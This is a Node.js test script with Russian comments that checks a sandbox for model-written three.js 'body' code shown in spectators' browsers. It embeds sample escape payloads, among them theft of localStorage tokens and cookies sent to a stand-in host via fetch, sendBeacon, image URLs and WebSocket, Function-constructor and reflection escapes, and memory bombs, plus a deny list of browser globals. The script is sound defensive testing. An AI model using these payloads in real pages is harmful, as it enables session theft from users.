/**
 * A1 для тела — гейт.
 *
 * Тело — единственный код в проекте, который пишет модель и исполняет браузер
 * ПОСТОРОННЕГО человека: зритель открыл чужой бой, и на его странице собирается
 * тысяча строк, написанных по свободному тексту другого игрока. Исходник мозга
 * не покидает сервер никогда (N19); тело обязано его покинуть — иначе нечего
 * рисовать, — и поэтому обязано быть обезврежено до отправки.
 *
 * Этот файл проверяет обе стороны сделки: что честные тела проходят и что
 * нечестные не проходят. Вторая половина без первой — это правило, которое
 * запрещает всё; первая без второй — правило, которое не запрещает ничего.
 *
 *   node tools/checkbody.mjs
 */

import { readFileSync, existsSync } from 'node:fs';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

import { analyseBody, BODY_FUEL_POSE, BODY_FUEL_BUILD } from '../src/server/sandbox/bodyrules.js';
import { SAFE_OBJECT_KEYS as BROWSER_KEYS, SHADOWED, buildBody } from '../src/viewer/loadbody.js';
import { SAFE_OBJECT_KEYS } from '../src/server/sandbox/instrument.js';

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
let failed = 0;
const ok = (name, good, note = '') => {
  console.log(`  ${good ? '✓' : '✗'} ${name}${note ? `  ${note}` : ''}`);
  if (!good) failed++;
};

console.log('\n  ГЕЙТ ТЕЛА\n');

/* ── честные тела проходят ─────────────────────────────────────────────── */
for (const f of ['bodies/octopus.js', 'bodies/gorilla.js']) {
  const r = analyseBody(readFileSync(join(ROOT, f), 'utf8'));
  ok(`${f} допущено`, r.ok, r.ok ? `${r.points} точек учёта топлива` : r.problems[0].message);
}

/* ── попытки побега ────────────────────────────────────────────────────── */
const ATTACKS = [
  ['кража сессии через fetch', "function build(T,S){fetch('//zlo/?t='+localStorage.token);return {}}"],
  ['кража через sendBeacon', "function build(T,S){navigator.sendBeacon('//zlo',document.cookie);return {}}"],
  ['утечка через адрес картинки', "function build(T,S){const i=new Image();i.src='//zlo/?'+localStorage.token;return {}}"],
  ['утечка через WebSocket', "function build(T,S){new WebSocket('wss://zlo');return {}}"],
  ['eval строки', "function build(T,S){eval('1+1');return {}}"],
  ['конструктор Function', "function build(T,S){new Function('return 1')();return {}}"],
  ['Function через constructor', "function build(T,S){({}).constructor.constructor('return 1')();return {}}"],
  ['доступ к globalThis', "function build(T,S){globalThis.x=1;return {}}"],
  ['порча общего пространства THREE', "function build(T,S){T.ColorManagement={};return {}}"],
  ['таймер вместо pose', "function build(T,S){setTimeout(()=>{},1);return {}}"],
  ['кадры вместо pose', "function build(T,S){requestAnimationFrame(()=>{});return {}}"],
  ['неявная глобаль', "function build(T,S){leak=1;return {}}"],
  ['подмена входной точки', "function make(T,S){return {}}"],
  ['динамический импорт', "function build(T,S){import('//zlo/x.js');return {}}"],
  ['чтение адреса страницы', "function build(T,S){const a=location.href;return {}}"],
  ['история браузера', "function build(T,S){history.pushState({},'','/x');return {}}"],
  ['часы вместо s.t', "function build(T,S){const n=Date.now();return {}}"],
];

/*
 * Побеги, которых разбор имён поймать НЕ МОЖЕТ, и это записано отдельно,
 * потому что список выше создаёт ложное чувство полноты.
 *
 * `({})['const'+'ructor']` — имени `constructor` в исходнике нет, оно
 * собирается на исполнении. Ни один обход дерева этого не увидит. Ловит
 * переписывание доступа по вычисляемому ключу (`instrument.js`), и проверять
 * надо именно его: что разметка состоялась, а не что имя нашли.
 */
const ASSEMBLED = [
  ['constructor строкой', "function build(T,S){const F=({})['constructor']['constructor'];F('return 1')();return {}}"],
  ['constructor по частям', "function build(T,S){const k='const'+'ructor';const F=({})[k][k];F('return 1')();return {}}"],
  ['__proto__ по частям', "function build(T,S){const k='__pro'+'to__';const q=({})[k];return {}}"],
];

/*
 * ТРЕТИЙ ПУТЬ, мимо обоих предыдущих.
 *
 *   Object.getOwnPropertyDescriptor(Object.getPrototypeOf(Object),'constructor').value
 *
 * Здесь `'constructor'` — АРГУМЕНТ вызова, а не имя свойства: в дереве это
 * строковый литерал внутри `CallExpression`, и ни разбор имён, ни
 * переписывание вычисляемых индексов его не касаются. Ловит только подмена
 * самого `Object` шимом без отражения — единственное, что работает, когда
 * погасить прототипы нельзя (браузер делит их со всей страницей).
 *
 * Это НЕ статическая проверка: код проходит анализ и обязан упасть при
 * ИСПОЛНЕНИИ. Поэтому он здесь и запускается.
 */
/*
 * ПОБЕГ ЧЕРЕЗ ПОДАРЕННЫЙ ОБЪЕКТ.
 *
 * Третий класс, и самый неочевидный: `THREE` мы отдаём телу САМИ, а через него
 * ведёт дорога наружу — `new THREE.ImageLoader().load(…)` создаёт настоящий
 * DOM-элемент, у элемента есть `ownerDocument.defaultView`, а это окно зрителя
 * со всем содержимым. Затенение имён тут бессильно: ни одно запрещённое имя не
 * названо.
 *
 * Держит фасад (`THREE_ALLOWED` в `loadbody.js`): телу видны только геометрия,
 * материалы и математика — измеренные 34 члена плюс безопасные соседи. Всё
 * остальное просто отсутствует, и попытка падает на «не конструктор».
 */
const VIA_THREE = [
  ['через ImageLoader', "function build(T,S){var i=new T.ImageLoader();return {isObject3D:true,userData:{pose(){}}};}"],
  ['через TextureLoader', "function build(T,S){var i=new T.TextureLoader();return {isObject3D:true,userData:{pose(){}}};}"],
  ['через WebGLRenderer', "function build(T,S){var r=new T.WebGLRenderer();return {isObject3D:true,userData:{pose(){}}};}"],
  ['через FileLoader', "function build(T,S){var l=new T.FileLoader();return {isObject3D:true,userData:{pose(){}}};}"],
];

/*
 * ПАМЯТЬ — четвёртый класс, и топливо его не ловит.
 *
 * Одна инструкция может стоить двести мегабайт, а цикл на сто тысяч итераций
 * по мегабайту тратит одну четырёхсотую топлива и четыреста гигабайт памяти.
 * Вкладка зрителя падает, и ни одна из трёх стен этого не видит.
 *
 * Проверяется исполнением: обе дыры (одно большое выделение и цикл) плюс
 * третья, где массивы выделяет сам three.js мимо нашего счётчика.
 */
const MEMORY = [
  ['одно выделение 200 МБ', "function build(T,S){const b=new Float32Array(50000000);b[0]=1;return {isObject3D:true,traverse(){},userData:{pose(){}}};}"],
  ['цикл на гигабайты', "function build(T,S){let k=[];for(let i=0;i<100000;i++){k.push(new Float32Array(1000000));}return {isObject3D:true,traverse(){},userData:{pose(){}}};}"],
  ['геометрия на 480 МБ', "function build(T,S){const g=new T.Group();g.add(new T.Mesh(new T.SphereGeometry(1,3000,3000), new T.MeshStandardMaterial()));g.userData.pose=()=>{};return g;}"],
];

const REFLECTION = [
  ['отражение до Function',
    "function build(T,S){var D=Object.getOwnPropertyDescriptor(Object.getPrototypeOf(Object),'constructor');"
    + "var F=D.value;F('globalThis.__escaped=1')();return {isObject3D:true,userData:{}}}"],
  ['прототип функции',
    "function build(T,S){var F=Object.getPrototypeOf(function(){}).constructor;"
    + "F('globalThis.__escaped=2')();return {isObject3D:true,userData:{}}}"],
];
let stopped = 0;
const slipped = [];
for (const [name, src] of ATTACKS) {
  const r = analyseBody(src);
  if (r.ok) slipped.push(name); else stopped++;
}
ok(`${stopped} из ${ATTACKS.length} побегов остановлено`, slipped.length === 0, slipped.join(', '));

{
  /* Память проверяется исполнением: код честный, объём — нет. */
  const THREE2 = await import('three/webgpu');
  const TSL2 = await import('three/tsl');
  const ate = [];
  for (const [name, src] of MEMORY) {
    const a = analyseBody(src);
    if (!a.ok) continue;
    try { buildBody(THREE2, TSL2, a.source, { trusted: false }); ate.push(name); } catch { /* остановлено */ }
  }
  ok('тело не может съесть память вкладки', ate.length === 0,
    ate.length ? `прошли: ${ate.join(', ')}` : `${MEMORY.length} попытки`);
}

{
  /* Побег через подаренный объект — только исполнением: имён он не называет,
     и анализ его пропускает по определению. */
  const { default: THREE } = { default: await import('three/webgpu') };
  const TSL = await import('three/tsl');
  const leaked = [];
  for (const [name, src] of VIA_THREE) {
    const a = analyseBody(src);
    if (!a.ok) continue;
    try {
      buildBody(THREE, TSL, a.source, { trusted: false });
      leaked.push(name);          /* построилось — значит загрузчик доступен */
    } catch { /* упало — фасад сработал */ }
  }
  ok('THREE отдаётся фасадом, а не целиком', leaked.length === 0,
    leaked.length ? `доступны: ${leaked.join(', ')}` : `${VIA_THREE.length} попытки`);
}

{
  /* Побег через отражение проверяется ИСПОЛНЕНИЕМ: он проходит анализ, и
     единственный честный ответ на вопрос «держит ли» — запустить и
     посмотреть. Строится тем же `buildBody`, что и в браузере. */
  const escaped = [];
  for (const [name, src] of REFLECTION) {
    globalThis.__escaped = null;
    const a = analyseBody(src);
    if (!a.ok) continue;
    try { buildBody({}, {}, a.source, { trusted: false }); } catch { /* упал — хорошо */ }
    if (globalThis.__escaped) escaped.push(name);
  }
  ok('отражение не доводит до Function', escaped.length === 0,
    escaped.length ? `вышли: ${escaped.join(', ')}` : `${REFLECTION.length} попытки`);
}

{
  /* Шим `Object` существует в двух экземплярах — серверном и браузерном, —
     потому что серверный модуль в браузер не отдаётся. Разными они быть не
     должны: расхождение здесь это дыра, которую видно только с одной
     стороны. */
  const extra = BROWSER_KEYS.filter((k) => !SAFE_OBJECT_KEYS.includes(k));
  const missing = SAFE_OBJECT_KEYS.filter((k) => !BROWSER_KEYS.includes(k));
  ok('шим Object одинаков на сервере и в браузере', !extra.length && !missing.length,
    [...extra.map((k) => `лишнее в браузере: ${k}`), ...missing.map((k) => `нет в браузере: ${k}`)].join(', ')
    || `${SAFE_OBJECT_KEYS.length} методов`);
}

{
  /* Здесь проверяется не отказ, а РАЗМЕТКА: код обязан пройти анализ (имени
     в нём нет) и обязан выйти из него с проверкой на каждом вычисляемом
     доступе. Тело без единого `__idx(` — это тело, которое поедет в браузер
     зрителя с открытой цепочкой к Function. */
  const unguarded = [];
  for (const [name, src] of ASSEMBLED) {
    const r = analyseBody(src);
    if (!r.ok) continue;                       /* отвергли — тоже годится */
    if (!/__idx\(/.test(r.source)) unguarded.push(name);
  }
  ok('собранные имена закрыты разметкой, а не списком', unguarded.length === 0,
    unguarded.length ? `без проверки: ${unguarded.join(', ')}` : `${ASSEMBLED.length} случаев`);
}

/* ── вторая стена: топливо вставлено ───────────────────────────────────── */
{
  const loop = 'function build(T,S){let i=0;while(true){i++;}return {};}';
  const r = analyseBody(loop);
  ok('вечный цикл размечается топливом', r.ok && /__fuel\(\)/.test(r.source),
    r.ok ? `${r.points} точек` : r.problems[0].message);
}

/* ── третья стена: список затенения покрывает список отказов ───────────── */
{
  const NAMED = ['fetch', 'XMLHttpRequest', 'WebSocket', 'navigator', 'localStorage',
    'sessionStorage', 'indexedDB', 'document', 'window', 'globalThis', 'self', 'top',
    'parent', 'location', 'Worker', 'require', 'process', 'Reflect', 'Proxy',
    'setTimeout', 'setInterval', 'requestAnimationFrame', 'Promise', 'Date', 'performance'];
  const missing = NAMED.filter((n) => !SHADOWED.includes(n));
  ok('всё, что запрещено анализом, затенено в браузере', missing.length === 0, missing.join(', '));
  /* `eval` и `arguments` затенить нельзя — их запрещено объявлять параметром
     в строгом режиме. Оба закрыты анализом, и это записано, а не забыто. */
  ok('eval не в списке затенения (его нельзя объявить параметром)', !SHADOWED.includes('eval'));
}

/* ── бюджеты топлива осмысленны ────────────────────────────────────────── */
ok('бюджет сборки больше бюджета кадра', BODY_FUEL_BUILD > BODY_FUEL_POSE * 10,
  `${BODY_FUEL_BUILD} против ${BODY_FUEL_POSE}`);

/* ── сгенерированные тела из forge/ ────────────────────────────────────── */
{
  const dir = join(ROOT, 'forge');
  if (existsSync(dir)) {
    const { readdirSync } = await import('node:fs');
    const files = readdirSync(dir).filter((f) => f.endsWith('.js'));
    let pass = 0; const fail = [];
    for (const f of files) {
      const r = analyseBody(readFileSync(join(dir, f), 'utf8'));
      if (r.ok) pass++; else fail.push(`${f}: ${r.problems[0].message.slice(0, 46)}`);
    }
    /* Это НЕ провал гейта: часть файлов в forge/ — старые эксперименты и
       заведомо сломанные образцы, на них и смотрели, когда искали, что
       модель делает не так. Цифра здесь как показание прибора: если она
       вдруг уедет в ноль, значит сломался анализ, а не модели. */
    console.log(`  · ${pass} из ${files.length} сохранённых тел проходят стены`);
    if (fail.length && fail.length <= 6) for (const x of fail) console.log(`      ${x}`);
    ok('анализ не отвергает всё подряд', pass > 0, `${pass} допущено`);
  }
}

{
  /*
   * РАЗМЕТКА НЕ ИМЕЕТ ПРАВА ЛОМАТЬ РАЗБОР.
   *
   * Инструментатор вставляет текст по индексам исходника, и две его правки —
   * учёт топлива и защита доступа по ключу — однажды столкнулись в одной
   * позиции: открывающая скобка блока оказалась внутри вызова, и исправное
   * тело переставало разбираться вообще. Поймал это гейт поз, но поймал
   * СЛУЧАЙНО — по симптому, а не по причине.
   *
   * Здесь проверяется причина: всё, что разбиралось до разметки, обязано
   * разбираться после. Тот же инструментатор стоит на каждом мозге.
   */
  const { parse } = await import('acorn');
  const broke = [];
  let checked = 0;
  const sources = [];
  for (const f of ['bodies/octopus.js', 'bodies/gorilla.js']) sources.push([f, readFileSync(join(ROOT, f), 'utf8')]);
  const bdir = join(ROOT, 'forge');
  if (existsSync(bdir)) {
    const { readdirSync } = await import('node:fs');
    for (const f of readdirSync(bdir).filter((x) => x.endsWith('.js')).slice(0, 40)) {
      sources.push([`forge/${f}`, readFileSync(join(bdir, f), 'utf8')]);
    }
  }
  /* И тела, которые уже носят существа: именно там нашлось первое сломанное
     разметкой, и именно они уезжают в браузер зрителя. */
  const dbFile = join(ROOT, 'data/airena.db');
  if (existsSync(dbFile)) {
    const { openDb } = await import('../src/server/db.js');
    const db = openDb(dbFile);
    for (const r of db.prepare('SELECT name, body_source FROM creature WHERE body_source IS NOT NULL').all()) {
      sources.push([`существо «${r.name}»`, r.body_source]);
    }
    db.close();
  }
  for (const [name, src] of sources) {
    try { parse(src, { ecmaVersion: 2022 }); } catch { continue; }   /* не разбирался и до нас */
    checked++;
    const r = analyseBody(src);
    if (!r.ok) continue;
    try { parse(r.source, { ecmaVersion: 2022 }); } catch (e) { broke.push(`${name}: ${e.message}`); }
  }
  ok('разметка не ломает разбор', broke.length === 0,
    broke.length ? broke.slice(0, 3).join('; ') : `${checked} исходников до и после`);
}

// ── законный JavaScript не отвергается ────────────────────────────────────
{
  /*
   * СТЕНА, КОТОРАЯ ОТВЕРГАЕТ ХОРОШИЙ КОД, — ТОЖЕ ПОЛОМКА.
   *
   * Все проверки выше спрашивают «пропустит ли стена плохое». Этот блок
   * спрашивает обратное, и он появился потому, что ответ был «нет»: обход шёл
   * строго по тексту, поэтому вызов функции РАНЬШЕ её объявления —
   * совершенно законный JS, подъём объявлений — получал «неизвестное имя».
   * Так написано пять тел из сорока двух в лабораторном корпусе.
   *
   * Стоило это дорого и молча: тело не собиралось, существо получало тело
   * архетипа, а выглядело это как «модель написала плохой код».
   *
   * Пары ниже устроены так, что каждая проверяет ОБЕ стороны: поднимается то,
   * что язык поднимает, и не поднимается то, что живёт во временной мёртвой
   * зоне. Иначе «починка» превратилась бы в разрешение всего подряд.
   */
  const body = (mid) => `function build(T,S){const g=new T.Group();${mid}g.userData.pose=(s)=>{g.rotation.y=s.turn||0;};return g;}`;
  const PAIRS = [
    ['функция вызвана выше своего объявления',
      'const m=new T.Mesh(makeGeo(T),null);function makeGeo(X){return new X.BoxGeometry(1,1,1);}g.add(m);', true],
    ['функция вызвана внутри другой функции выше объявления',
      'function a(X){return b(X);}function b(X){return new X.BoxGeometry(1,1,1);}g.add(new T.Mesh(a(T),null));', true],
    ['var поднимается',
      'later=1;var later;', true],
    ['функция, объявленная в блоке, видна в этом блоке',
      'if(S){const q=inner();function inner(){return 1;}g.scale.setScalar(q);}', true],
    ['let до объявления — временная мёртвая зона, отказ',
      'g.rotation.x=nope;let nope=1;', false],
    ['const до объявления — отказ',
      'g.rotation.x=nope2;const nope2=1;', false],
    ['class до объявления — отказ',
      'const q=new Later();class Later{}g.add(q);', false],
    /*
     * КЛАССЫ. Здесь был ТОЛЬКО отрицательный случай — «class до объявления
     * обязан упасть», — и он проходил по неправильной причине: классы падали
     * ВСЕГДА. Ключи членов не выводились из-под проверки имён, поэтому метод
     * читался как свободная глобаль, а `constructor` доставал `Object` из
     * прототипа таблицы запретов и печатался игроку как
     * `forbidden: function Object() { [native code] }`.
     *
     * Проверка, у которой есть только отрицательный случай, доказывает, что
     * стена умеет отказывать, — и ничего не говорит о том, отказывает ли она
     * по делу. Ровно это D70 и требует не делать.
     */
    ['класс с конструктором', 'class R{constructor(n){this.n=n;}}const r=new R(1);g.scale.setScalar(r.n);', true],
    ['класс с методом', 'class R{m(){return 1;}}g.scale.setScalar(new R().m());', true],
    ['класс с полем', 'class R{n=1;}g.scale.setScalar(new R().n);', true],
    ['класс со статическим членом', 'class R{static k=2;}g.scale.setScalar(R.k);', true],
    ['геттер в классе', 'class R{get v(){return 3;}}g.scale.setScalar(new R().v);', true],
    ['метод по имени constructor не путается с прототипом',
      'class R{constructor(){this.q=1;}}g.scale.setScalar(new R().q);', true],
    /* Ключ `constructor` в литерале законен — это просто имя поля. ЧТЕНИЕ
       `.constructor` незаконно и обязано падать: это и есть побег к
       `Function` через прототип. Две половины одного случая, и обе нужны. */
    /*
     * ОБЁРТКА МОДУЛЯ. Модели пишут `import * as THREE from 'three'` наверху и
     * `export function build` внизу по привычке — так выглядит любой файл
     * three.js, который они видели. Системный промпт запрещает это прямым
     * текстом; дешёвая модель написала импорт ЧЕТЫРЕ РАЗА ИЗ ЧЕТЫРЁХ, и тело
     * отвергалось с сообщением «не разбирается», хотя весь остальной код был
     * правильным. Это, а не качество кода, объясняет, почему сгенерированных
     * тел в базе почти не было.
     *
     * Обёртка снимается. Но именно снимается: код, который на импорт
     * ОПИРАЛСЯ, обязан упасть, а `import(...)` как выражение — остаться
     * запрещённым. Обе половины проверяются здесь, иначе «починка»
     * превратилась бы в открытую дверь.
     */
    ['обёртка модуля снимается', 'ФАЙЛ:import * as THREE from \'three\';\nexport ', true],
    /* CommonJS — та же привычка моделей, что и ES-модуль. Снимается только
       хвостовое присваивание экспорта; `module` и `exports` везде ещё
       остаются неизвестными именами, и обе половины проверяются. */
    ['обёртка CommonJS снимается', 'ФАЙЛ:\nmodule.exports = build;', true],
    ['exports.build снимается', 'ФАЙЛ:\nexports.build = build;', true],
    ['module.require по-прежнему запрещён', 'const q = module.require(\'fs\');', false],
    ['запись в module.foo по-прежнему запрещена', 'ФАЙЛ:\nmodule.foo = 1;', false],
    ['async в теле запрещён', 'const f = async () => 1; f();', false],
    ['new.target законен', 'function F(){ if (new.target) g.rotation.y = 0; } new F();', true],
    ['export { build } отдельной строкой', 'ФАЙЛ:\nexport { build };', true],
    ['код, опирающийся на импорт, падает', 'ФАЙЛ:import * as Q from \'three\';\nQ.x;\n', false],
    ['динамический import в теле по-прежнему запрещён',
      'import(\'data:text/javascript,1\');', false],
    ['сеть через обёртку модуля по-прежнему запрещена', 'ФАЙЛ:import q from \'y\';\nfetch(\'/x\');\n', false],
    ['ключ constructor в литерале законен',
      'const o={constructor:1};g.scale.setScalar(Object.keys(o).length);', true],
    ['чтение .constructor по-прежнему запрещено',
      'const o={a:1};g.scale.setScalar(o.constructor.name.length);', false],
    ['генератор', 'function* gen(){yield 1;}g.scale.setScalar([...gen()][0]);', true],
    ['теговый шаблон', 'const t=(x)=>x[0].length;g.scale.setScalar(t`abc`);', true],
    ['вычисляемый доступ', 'const o={a:1};const k=\'a\';g.scale.setScalar(o[k]);', true],
    ['настоящее неизвестное имя — отказ',
      'g.rotation.x=совсемНеизвестное;', false],
  ];
  const wrong = [];
  for (const [why, mid, shouldPass] of PAIRS) {
    /* `ФАЙЛ:` — случай про ВЕСЬ файл, а не про середину `build`: обёртка
       модуля живёт на верхнем уровне, внутрь функции её не засунуть. */
    /* `ФАЙЛ:` — случай про ВЕСЬ файл. Кусок, начинающийся с перевода строки,
       приписывается ПОСЛЕ тела (так пишут `module.exports` и `export {}`),
       остальное — перед ним (так пишут `import`). Раньше приписывалось только
       перед, и хвостовые обёртки склеивались с объявлением в одну строку. */
    const src = mid.startsWith('ФАЙЛ:')
      ? (mid.slice(5).startsWith('\n') ? body('') + mid.slice(5) : mid.slice(5) + body(''))
      : body(mid);
    const r = analyseBody(src);
    if (r.ok !== shouldPass) {
      wrong.push(`${why}: ${r.ok ? 'прошло, а не должно' : `отказ ${r.problems[0]?.code}`}`);
    }
  }
  ok('подъём объявлений понимается как в языке', wrong.length === 0,
    wrong.length ? wrong.slice(0, 3).join('; ') : `${PAIRS.length} случаев, ${PAIRS.filter((x) => x[2]).length} обязаны проходить`);
}

/*
 * ── ПОТОЛОК ЦЕНЫ ПОКАЗА: ОБА КОНЦА ─────────────────────────────────────────
 *
 * `DRAW_MAX` появился в приёмке, а отдача тела по HTTP считала цену СВОИМ
 * обходом — и считала другое: только меши, без точек, линий и спрайтов. Два
 * счёта одного потолка расходятся молча, и тело, принятое одним, отвергается
 * другим. Плюс ни один гейт не трогал ни отказ, ни ленивый счёт.
 *
 * Проверяется то, что должно быть верно всегда: счёт один на оба места,
 * эталоны в потолок вписываются, тело сверх потолка приёмка отвергает.
 */
{
  const { DRAW_MAX, drawCost, posesRun } = await import('../src/server/forge/body.js');
  const T = await import('three/webgpu');
  const S = await import('three/tsl');

  const heavy = `function build(T,S){const g=new T.Group();for(let i=0;i<${DRAW_MAX + 200};i++){`
    + 'const m=new T.Mesh(new T.BoxGeometry(0.02,0.02,0.02),new T.MeshStandardNodeMaterial());'
    + 'm.position.set(i%20*0.05,Math.floor(i/400)*0.05,0);g.add(m);}'
    + 'g.userData.pose=(s)=>{g.rotation.y=s.t;};return g;}';
  const a = analyseBody(heavy);
  const r = a.ok ? await posesRun(a.source) : { ok: true, message: 'разбор отказал раньше' };
  ok('тело дороже потолка отрисовки отвергается', !r.ok && /вызовов отрисовки/.test(String(r.message)),
    r.ok ? 'ПРОШЛО, А НЕ ДОЛЖНО' : String(r.message).slice(0, 64));

  for (const f of ['bodies/octopus.js', 'bodies/gorilla.js']) {
    const built = buildBody(T, S, readFileSync(join(ROOT, f), 'utf8'), { trusted: true });
    const cost = drawCost(built);
    ok(`${f} вписывается в потолок отрисовки`, cost <= DRAW_MAX, `${cost} при потолке ${DRAW_MAX}`);
  }

  /*
   * И ГЛАВНОЕ: выдача тела НЕ СТРОИТ его.
   *
   * Цена считается на приёмке и едет в базу; сервер только читает число. Здесь
   * стоял ленивый счёт прямо в обработчике — то есть построение кода,
   * написанного посторонней моделью, в главном процессе. Стены те же, что в
   * браузере, побега не нашлось, но цена ошибки становилась другой: не сессия
   * зрителя, а сервер. Проверяется текстом, потому что построение — это и есть
   * дефект.
   */
  const api = readFileSync(join(ROOT, 'src/server/api.js'), 'utf8');
  ok('выдача тела не строит чужое тело в процессе сервера',
    !/buildBody\(/.test(api) && !/isMesh/.test(api),
    /buildBody\(/.test(api) ? 'в api.js остался buildBody' : 'только чтение body_draws');
}

/*
 * ── СКЛЕЙКА НЕПОДВИЖНЫХ ЧАСТЕЙ НИЧЕГО НЕ МЕНЯЕТ, КРОМЕ ЧИСЛА ВЫЗОВОВ ───────
 *
 * `bake.js` сливает меши, которые поза не двигает: замерено в Chrome, что кадр
 * стоит около 6 мкс на вызов отрисовки, а наши эталонные тела дают их по две
 * тысячи. После склейки — 19 кадров в секунду против 99 при том же числе
 * треугольников.
 *
 * «При том же числе» — это и есть то, что здесь проверяется. Склейка обязана
 * быть невидимой: столько же треугольников, тот же габарит в мире, та же
 * подвижность. Если она хоть что-то меняет на экране — она не оптимизация, а
 * порча картинки, и лучше медленно.
 */
{
  const { bakeStatic, PROBE } = await import('../src/viewer/bake.js');
  const T = await import('three/webgpu');
  const S = await import('three/tsl');
  const tris = (root) => { let n = 0; root.traverse((o) => { if (o.isMesh && o.geometry) { const g = o.geometry; n += (g.index ? g.index.count : g.attributes.position.count) / 3; } }); return Math.round(n); };
  /*
   * Меряется ТО, ЧЕМ ПОЛЬЗУЕТСЯ ВЬЮВЕР, а не `Box3.setFromObject`.
   *
   * Тело ставится на пол по `spanY` (`main.js`), а он считает вертикальный
   * размах по коробкам частей и первой строке мировой матрицы. У склейки
   * коробка одна на всех, и `setFromObject` показал бы расхождение в 0.23 м —
   * при том что `spanY` читает сохранённые коробки частей и остаётся точным.
   * Проверять надо ту величину, от которой зависит картинка.
   */
  const spanOf = (root) => {
    root.updateMatrixWorld(true);
    let lo = Infinity; let hi = -Infinity;
    root.traverse((o) => {
      if (!o.isMesh || !o.geometry) return;
      if (!o.geometry.boundingBox) o.geometry.computeBoundingBox();
      const e = o.matrixWorld.elements;
      const ax = e[1]; const ay = e[5]; const az = e[9];
      if (o.userData.subParts) {
        for (const p of o.userData.subParts) {
          const c = ax * p.c.x + ay * p.c.y + az * p.c.z + e[13];
          const r = Math.abs(ax * p.u.x + ay * p.u.y + az * p.u.z)
            + Math.abs(ax * p.v.x + ay * p.v.y + az * p.v.z)
            + Math.abs(ax * p.w.x + ay * p.w.y + az * p.w.z);
          if (c - r < lo) lo = c - r;
          if (c + r > hi) hi = c + r;
        }
      } else {
        const bb = o.geometry.boundingBox;
        const c = ax * (bb.min.x + bb.max.x) * 0.5 + ay * (bb.min.y + bb.max.y) * 0.5
          + az * (bb.min.z + bb.max.z) * 0.5 + e[13];
        const r = Math.abs(ax) * (bb.max.x - bb.min.x) * 0.5
          + Math.abs(ay) * (bb.max.y - bb.min.y) * 0.5
          + Math.abs(az) * (bb.max.z - bb.min.z) * 0.5;
        if (c - r < lo) lo = c - r;
        if (c + r > hi) hi = c + r;
      }
    });
    return [lo, hi];
  };

  for (const f of ['bodies/octopus.js', 'bodies/gorilla.js']) {
    const src = readFileSync(join(ROOT, f), 'utf8');
    const a = buildBody(T, S, src, { trusted: true });
    const b = buildBody(T, S, src, { trusted: true });
    const meshesBefore = (() => { let n = 0; a.traverse((o) => { if (o.isMesh && o.geometry) n++; }); return n; })();
    const r = bakeStatic(T, b);
    /*
     * Обе ставятся в ОДНУ позу перед сравнением: `bakeStatic` прогоняет позу,
     * чтобы понять, что двигается, и оставляет тело в последнем состоянии
     * («умирает»). Сравнивать его с нетронутым — это сравнивать разные позы и
     * называть разницу порчей геометрии. Первый прогон так и сделал: 1.7 м
     * расхождения, и оно было честным ответом на неверный вопрос.
     */
    /* Та же история вызовов: `bakeStatic` прогоняет `PROBE` дважды (сначала
       ищет подвижные узлы, потом снимает отпечаток), значит и эталон должен. */
    for (let pass = 0; pass < 2; pass++) for (const st of PROBE) a.userData.pose(st);
    const POSE = { t: 0.7, dt: 1 / 60, speed: 5, stride: 0.8, turn: 1, grounded: true, health: 1, action: null, phase: 0.5 };
    a.userData.pose(POSE); b.userData.pose(POSE);
    const before = { tris: tris(a), box: spanOf(a), meshes: meshesBefore };
    const after = { tris: tris(b), box: spanOf(b) };

    ok(`${f}: склейка состоялась`, !r.reverted && r.groups > 0,
      r.reverted ? `откачена: ${r.why}` : `${r.before} → ${r.after} мешей, ${r.groups} склеек`);
    ok(`${f}: треугольников столько же`, before.tris === after.tris, `${before.tris} против ${after.tris}`);
    const off = Math.max(...before.box.map((v, i) => Math.abs(v - after.box[i])));
    ok(`${f}: постановка на пол не сдвинулась`, off < 1e-3, `наибольшее расхождение ${off.toExponential(1)} м`);
    ok(`${f}: вызовов стало меньше вдвое и больше`, r.after * 2 <= before.meshes,
      `${before.meshes} → ${r.after}`);
  }
}

// ── своё тело обязано быть НАДЕТО, а не просто лежать в базе ──────────────
{
  /*
   * Тело можно сгенерировать, проверить, положить в базу и отдавать по сети —
   * и всё равно не показать. Между «тело есть» и «тело видно» стоит одна
   * колонка: `body_ref`. `gen:<id>` — зритель грузит своё, `octopus` — стоковое
   * архетипа.
   *
   * Ровно это и было сломано: конвейер оставлял `bodyRef: archetype` с
   * комментарием «`gen:` подставит слой хранения», а слой хранения не
   * подставлял. Существа игроков носили стоковые тела, и снаружи это читалось
   * как «генерация не работает» — при том что она работала.
   *
   * Проверка идёт ДВУМЯ путями, и это не дублирование:
   *   1) по живой базе — не осталось ли уже надетого чужого;
   *   2) вызовом `create()` на временной базе — не вернётся ли поломка в код.
   * Первый путь без второго молчит на пустой базе; второй без первого не видит
   * существ, рождённых до правки.
   */
  const dbFile = join(ROOT, 'data/airena.db');
  if (existsSync(dbFile)) {
    const { openDb } = await import('../src/server/db.js');
    const db = openDb(dbFile);
    const wrong = db.prepare(`SELECT id, name, body_ref FROM creature
      WHERE body_safe IS NOT NULL AND body_ref NOT LIKE 'gen:%'`).all();
    const total = db.prepare('SELECT COUNT(*) c FROM creature WHERE body_safe IS NOT NULL').get().c;
    db.close();
    ok('в базе никто со своим телом не носит стоковое', wrong.length === 0,
      wrong.length ? wrong.map((r) => `${r.name}: body_ref=${r.body_ref}`).join('; ')
        : `${total} существ со своим телом, все носят своё`);
  }

  const { mkdtempSync, rmSync } = await import('node:fs');
  const { tmpdir } = await import('node:os');
  const dir = mkdtempSync(join(tmpdir(), 'airena-bodyref-'));
  try {
    const { openDb } = await import('../src/server/db.js');
    const { create } = await import('../src/server/creatures.js');
    const db = openDb(join(dir, 't.db'));
    const base = {
      name: 'ПРОБА', archetype: 'octopus', kit: [], brainSource: 'export function think(){}',
      brainModel: 'проба', constantsVersion: 'c-0', tacticsCard: '', unfit: [],
    };
    const withBody = create(db, { ...base, bodySafe: 'export function build(){}', bodySource: 'x', bodyDraws: 1, bodyRef: 'octopus' });
    const without = create(db, { ...base, bodyRef: 'octopus' });
    db.close();
    ok('своё тело надевается на существо', withBody.body_ref === `gen:${withBody.id}`,
      `body_ref=${withBody.body_ref}`);
    ok('без своего тела остаётся архетип', without.body_ref === 'octopus',
      `body_ref=${without.body_ref}`);
  } finally { rmSync(dir, { recursive: true, force: true }); }
}

console.log(`\n  ${failed ? `ПРОВАЛ: ${failed}` : 'ДЕРЖИТ'}\n`);
process.exitCode = failed ? 1 : 0;
